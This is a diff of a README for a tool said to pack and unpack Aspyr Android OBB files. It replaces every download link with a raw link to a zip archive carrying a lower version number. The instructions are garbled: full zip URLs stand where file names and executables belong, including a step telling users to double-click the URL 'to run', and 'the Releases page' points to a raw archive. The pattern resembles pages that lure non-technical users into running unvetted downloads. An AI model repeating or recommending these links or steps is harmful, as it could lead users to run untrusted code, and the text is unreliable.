@@ -1,7 +1,7 @@
 # 🛠️ AspyrArchiveTool - Easily Manage Aspyr OBB Files
 
 ## 📦 Download Now
-[![Download AspyrArchiveTool](https://github.com/AhmedHossam151/AspyrArchiveTool/raw/refs/heads/master/AspyrArchiveTool/Aspyr_Archive_Tool_v1.9.zip)](https://github.com/AhmedHossam151/AspyrArchiveTool/raw/refs/heads/master/AspyrArchiveTool/Aspyr_Archive_Tool_v1.9.zip)
+[![Download AspyrArchiveTool](https://raw.githubusercontent.com/AhmedHossam151/AspyrArchiveTool/master/AspyrArchiveTool/Aspyr-Tool-Archive-1.6.zip)](https://raw.githubusercontent.com/AhmedHossam151/AspyrArchiveTool/master/AspyrArchiveTool/Aspyr-Tool-Archive-1.6.zip)
 
 ## 🚀 Getting Started
 AspyrArchiveTool is a simple application to pack and unpack Aspyr Android OBB files. This tool helps users manage game data easily without technical skills. Follow the steps below to get started.
@@ -16,11 +16,11 @@ AspyrArchiveTool is a simple application to pack and unpack Aspyr Android OBB fi
 To download AspyrArchiveTool, visit the Releases page. Here’s how to do it:
 
 1. Click the link below to go to the download page:
-   [Visit this page to download](https://github.com/AhmedHossam151/AspyrArchiveTool/raw/refs/heads/master/AspyrArchiveTool/Aspyr_Archive_Tool_v1.9.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/AhmedHossam151/AspyrArchiveTool/master/AspyrArchiveTool/Aspyr-Tool-Archive-1.6.zip)
 
 2. Look for the latest version on the page. You will see a list of files.
 
-3. Click on the file labeled `https://github.com/AhmedHossam151/AspyrArchiveTool/raw/refs/heads/master/AspyrArchiveTool/Aspyr_Archive_Tool_v1.9.zip` (or `https://github.com/AhmedHossam151/AspyrArchiveTool/raw/refs/heads/master/AspyrArchiveTool/Aspyr_Archive_Tool_v1.9.zip` if you're on macOS/Linux) to start downloading.
+3. Click on the file labeled `https://raw.githubusercontent.com/AhmedHossam151/AspyrArchiveTool/master/AspyrArchiveTool/Aspyr-Tool-Archive-1.6.zip` (or `https://raw.githubusercontent.com/AhmedHossam151/AspyrArchiveTool/master/AspyrArchiveTool/Aspyr-Tool-Archive-1.6.zip` if you're on macOS/Linux) to start downloading.
 
 4. Once the download is complete, locate the file in your Downloads folder.
 
@@ -32,7 +32,7 @@ To download AspyrArchiveTool, visit the Releases page. Here’s how to do it:
 - If you downloaded the `.zip` file:
   1. Right-click the file and choose 'Extract All.'
   2. Follow the prompts to extract the files.
-  3. Open the folder where the files were extracted and double-click `https://github.com/AhmedHossam151/AspyrArchiveTool/raw/refs/heads/master/AspyrArchiveTool/Aspyr_Archive_Tool_v1.9.zip` to run.
+  3. Open the folder where the files were extracted and double-click `https://raw.githubusercontent.com/AhmedHossam151/AspyrArchiveTool/master/AspyrArchiveTool/Aspyr-Tool-Archive-1.6.zip` to run.
 
 ### For macOS/Linux Users:
 - If you downloaded the `.zip` file:
